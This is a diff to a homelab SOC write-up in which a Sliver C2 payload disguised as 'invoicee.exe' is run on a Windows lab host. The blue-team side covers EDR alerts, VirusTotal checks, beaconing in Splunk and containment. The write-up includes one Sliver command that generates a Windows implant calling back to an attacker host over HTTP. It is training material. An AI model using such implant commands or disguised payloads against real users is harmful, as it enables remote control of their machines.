@@ -3,7 +3,6 @@
 ## Project Overview
 
 **Scenario:** Initial Access via User Execution  
-**Perspective:** Red Team Simulation & Blue Team Detection  
 **Environment:** Homelab SOC Simulation  
 
 **Tools Used**
@@ -37,38 +36,57 @@ A malicious Windows payload named **`invoicee.exe`** was delivered to a victim w
 generate --http 192.168.1.101:80 --save /opt/invoicee.exe --os windows
 ```
 
-📸 **Screenshot Placement**
-```md
-![Sliver payload generation command](screenshots/phase-1/sliver-payload-generation.png)
-```
-*Shows Sliver C2 payload creation and command execution.*
+<p align="center">
+  <img src="images/generate.png" alt="Sliver C2 payload creation command" width="800">
+</p>
+<p align="center">
+  <em>Figure 1: Sliver C2 payload generation and command execution.</em>
+</p>
 
 ---
 
 A malicious payload named **`invoicee.exe`** was generated and saved to `/opt/invoicee.exe`.
 
-The filename was intentionally chosen to appear legitimate and familiar, increasing the likelihood of successful user execution through **social engineering**.
+The filename was intentionally chosen to appear legitimate and familiar, increasing the likelihood of successful execution through **social engineering**.
 
 ### Delivery Method
-- Manual drag-and-drop into the victim’s **Downloads** folder
 
-📸 **Screenshot Placement**
-```md
-![Malicious file in Downloads folder](screenshots/phase-1/malware-in-downloads.png)
-```
-*Shows invoicee.exe placed in the user Downloads directory.*
+In this lab scenario, the payload was hosted on an attacker-controlled web server. The victim unknowingly downloaded the file, believing it to be legitimate.
+
+In a real-world scenario, similar payload delivery could occur via:
+- Phishing emails with malicious attachments
+- Drive-by downloads
+- Compromised websites
+- Malicious file-sharing links
+
+<p align="center">
+  <img src="images/host.png" alt="Malicious file delivered to Downloads directory" width="800">
+</p>
+<p align="center">
+  <em>Figure 2: Malicious payload delivered to the user Downloads directory.</em>
+</p>
 
 ---
 
 ### Execution
-- User manually double-clicked the file
+- The user manually double-clicked the file
 - No exploitation or lateral movement was used
 
-📸 **Screenshot Placement**
-```md
-![User executing invoicee.exe](screenshots/phase-1/user-execution.png)
-```
-*Demonstrates manual execution by the user.*
+<p align="center">
+  <img src="images/running.png" alt="Manual execution of the malicious file" width="800">
+</p>
+<p align="center">
+  <em>Figure 3: Manual execution of the payload by the user.</em>
+</p>
+
+Following execution, a connection was established back to the attacker-controlled C2 server.
+
+<p align="center">
+  <img src="images/established.png" alt="C2 connection established to attacker" width="800">
+</p>
+<p align="center">
+  <em>Figure 4: Successful C2 connection established with the attacker.</em>
+</p>
 
 ---
 
@@ -82,27 +100,31 @@ LimaCharlie EDR generated alerts indicating suspicious activity on the host:
 
 - **Hostname:** `fadhli-pc.redgunn.local`
 - Execution of an unsigned binary
-- Execution path within the **Downloads** directory
+- Execution from the **Downloads** directory
 - YARA detections in memory
 
-📸 **Screenshot Placement**
-```md
-![LimaCharlie alert - suspicious execution](screenshots/phase-1/limacharlie-execution-alert.png)
-```
-*EDR alert showing suspicious process execution.*
+<p align="center">
+  <img src="images/edr.png" alt="EDR alert showing suspicious process execution" width="800">
+</p>
+<p align="center">
+  <em>Figure 5: LimaCharlie alert indicating suspicious process execution.</em>
+</p>
 
 ---
 
-The process tree shows:
+The process tree revealed:
 
 - **Parent Process:** `explorer.exe`
 - **Child Process:** `invoicee.exe`
 
-📸 **Screenshot Placement**
-```md
-![Process tree showing explorer.exe spawning invoicee.exe](screenshots/phase-1/process-tree.png)
-```
-*Confirms manual user execution.*
+<p align="center">
+  <img src="images/tree.png" alt="Process tree showing explorer.exe spawning invoicee.exe" width="800">
+</p>
+<p align="center">
+  <em>Figure 6: Process tree confirming manual user execution.</em>
+</p>
+
+This confirms the binary was executed directly by the user rather than through automated or lateral movement techniques.
 
 ---
 
@@ -118,15 +140,7 @@ The process tree shows:
 
 #### Action
 
-The SOC analyst extracted the SHA256 hash from LimaCharlie telemetry and performed reputation analysis.
-
-📸 **Screenshot Placement**
-```md
-![File hash from EDR telemetry](screenshots/phase-1/file-hash-extraction.png)
-```
-*Shows hash extraction from LimaCharlie.*
-
----
+The SOC analyst extracted the SHA256 hash from LimaCharlie telemetry and performed a reputation check.
 
 #### Artifacts
 - **File Path:**  
@@ -145,44 +159,46 @@ The SOC analyst extracted the SHA256 hash from LimaCharlie telemetry and perform
 - **Result:** 0 detections
 - **Assessment:** No existing global reputation
 
-📸 **Screenshot Placement**
-```md
-![VirusTotal zero detection result](screenshots/phase-1/virustotal-zero-detection.png)
-```
-*Initial VT scan showing no detections.*
+<p align="center">
+  <img src="images/VT.png" alt="Initial VirusTotal scan with zero detections" width="800">
+</p>
+<p align="center">
+  <em>Figure 7: Initial VirusTotal scan showing zero detections.</em>
+</p>
 
 ---
 
 **Analyst Assessment:**  
-A zero-detection binary appearing in the user Downloads directory is classified as **highly suspicious** and indicative of:
+A zero-detection binary executed from the Downloads directory is considered **highly suspicious** and often indicative of:
 - Custom-compiled malware
-- Targeted payload
-- Polymorphic or new dropper
+- Targeted attacks
+- Polymorphic or newly generated payloads
 
 ---
 
 #### Secondary VirusTotal Submission
 
-The binary was manually uploaded to VirusTotal for deeper inspection.
+The binary was manually uploaded to VirusTotal for further analysis.
 
 - **Result:** CRITICAL  
-- **Detection Rate:** 58 / 70 vendors
+- **Detection Rate:** 19 / 71 vendors
 
-📸 **Screenshot Placement**
-```md
-![VirusTotal high detection result](screenshots/phase-1/virustotal-high-detection.png)
-```
-*Post-submission VT results confirming malware.*
+<p align="center">
+  <img src="images/result.png" alt="VirusTotal results confirming malware" width="800">
+</p>
+<p align="center">
+  <em>Figure 8: VirusTotal results confirming the file as malicious.</em>
+</p>
 
 ---
 
 **Analyst Conclusion:**  
-The file is confirmed malicious with high confidence.
+The binary is confirmed malicious with high confidence.
 
 **Decision:** Escalate to containment.
 
 - **Indicator Type:** Atomic Indicator  
-- **Indicator Value:** Known Bad Hash
+- **Indicator Value:** Known malicious hash
 
 ---
 
@@ -190,35 +206,44 @@ The file is confirmed malicious with high confidence.
 
 #### Observation
 
-Immediately after execution, the process initiated outbound network communication.
+Immediately after execution, the process initiated outbound network communication:
 
 - **Destination IP:** `192.168.1.101`
 - **Port:** `80 (HTTP)`
 - **Pattern:** Repeated outbound connections (Beaconing)
 
-📸 **Screenshot Placement**
-```md
-![Outbound C2 beaconing traffic](screenshots/phase-1/c2-beaconing.png)
-```
-*Network telemetry showing C2 communication.*
+<p align="center">
+  <img src="images/c2.png" alt="Network telemetry showing C2 beaconing" width="800">
+</p>
+<p align="center">
+  <em>Figure 9: Network telemetry indicating C2 beaconing activity.</em>
+</p>
 
 ---
 
-This activity was observed through:
+This activity was correlated using:
 - LimaCharlie EDR network telemetry
-- Splunk correlation logs
+- Splunk SIEM logs
 
-📸 **Screenshot Placement**
-```md
-![Splunk logs showing beaconing correlation](screenshots/phase-1/splunk-beaconing-correlation.png)
-```
-*SIEM correlation confirming C2 activity.*
+<p align="center">
+  <img src="images/splunk.png" alt="Splunk logs correlating C2 activity" width="800">
+</p>
+<p align="center">
+  <em>Figure 10: Splunk correlation confirming C2 traffic.</em>
+</p>
+
+<p align="center">
+  <img src="images/splunk2.png" alt="Additional Splunk evidence of C2 activity" width="800">
+</p>
+<p align="center">
+  <em>Figure 11: Additional SIEM evidence supporting C2 communication.</em>
+</p>
 
 ---
 
 #### Analyst Assessment
 
-The consistent outbound pattern strongly matches **C2 beacon behavior**, confirming successful attacker communication.
+The consistent outbound traffic pattern strongly matches known **C2 beacon behavior**, confirming successful attacker communication.
 
 ---
 
@@ -227,20 +252,20 @@ The consistent outbound pattern strongly matches **C2 beacon behavior**, confirm
 ### 4.1 LimaCharlie EDR Rule
 
 The following Detection & Response logic triggers on:
-
 - Unsigned binaries
-- Executed from user-writable directories
-- Establishing outbound internet connections
+- Execution from user-writable directories
+- Outbound network connections
 
-📸 **Screenshot Placement**
-```md
-![LimaCharlie detection rule](screenshots/phase-1/edr-detection-rule.png)
-```
-*EDR rule logic used for detection.*
+<p align="center">
+  <img src="images/rule.png" alt="EDR detection rule logic" width="800">
+</p>
+<p align="center">
+  <em>Figure 12: LimaCharlie detection rule used to identify the threat.</em>
+</p>
 
 ---
 
-*(Rule logic intentionally omitted for brevity / OPSEC)*
+*(Rule logic intentionally omitted for brevity / OPSEC.)*
 
 ---
 
@@ -249,14 +274,22 @@ The following Detection & Response logic triggers on:
 ### Containment Status: **Delayed**
 
 **Reasoning:**  
-The infected host was deliberately left active to observe:
-
+The host was intentionally left active to observe subsequent attack phases:
 - Phase 2 — Privilege Escalation
-- Phase 3 — Persistence mechanisms
+- Phase 3 — Persistence
+
+<p align="center">
+  <img src="images/contain.png" alt="EDR isolate host option" width="800">
+</p>
+<p align="center">
+  <em>Figure 13: EDR option to isolate the compromised host.</em>
+</p>
 
 ---
 
-### Real-World Scenario
+### Real-World Response
 
 In a production environment:
-- The endpoint w
+- Endpoint isolation would be immediate
+- Network communication would be blocked
+- Memory and disk artifacts would be preserved for forensic analysis
